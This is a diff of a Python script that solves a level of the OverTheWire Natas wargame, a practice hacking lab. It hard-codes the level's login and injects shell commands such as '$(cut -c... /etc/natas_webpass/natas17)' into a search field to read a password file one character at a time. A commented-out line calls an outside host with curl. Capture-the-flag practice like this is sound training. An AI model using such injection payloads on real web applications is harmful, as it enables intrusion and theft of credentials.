@@ -1,19 +1,30 @@
 import requests
 import datetime
 import sys
+import re
 
 key  = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
 user = 'natas16'
 url  = 'natas16.natas.labs.overthewire.org'
-payload = {'needle':'$(cut -c5 /etc/natas_webpass/natas17)'}
-
-req = requests.get('http://' + user +':'+ key +"@"+ url, payload)
-
-print req.request.headers
-print req.text
+payload = {'needle':'^$(cut -c2 /etc/natas_webpass/natas16)$'}
+# payload = {'needle':'$(curl http://verfriemelt.org)'}
 
 
+# print re.search('([a-z]+)','12 hallo was geht ')
 
+# sys.exit('quiut')
+
+
+
+
+for i in range(1,34):
+# for i in (1,4,6,11,14,16,30):
+    # print  '^$(cut -c'+ `i` +' /etc/natas_webpass/natas17)$'
+    payload.update({'needle': '^$(cut -c'+ `i` +' /etc/natas_webpass/natas16)$'})
+    req = requests.post('http://' + user +':'+ key +"@"+ url, payload)
+    # print req.request.headers
+
+    print req.text[req.text.find('<pre>')+5:].split('\n')[1]
 
 
 # time_start = datetime.datetime.now();
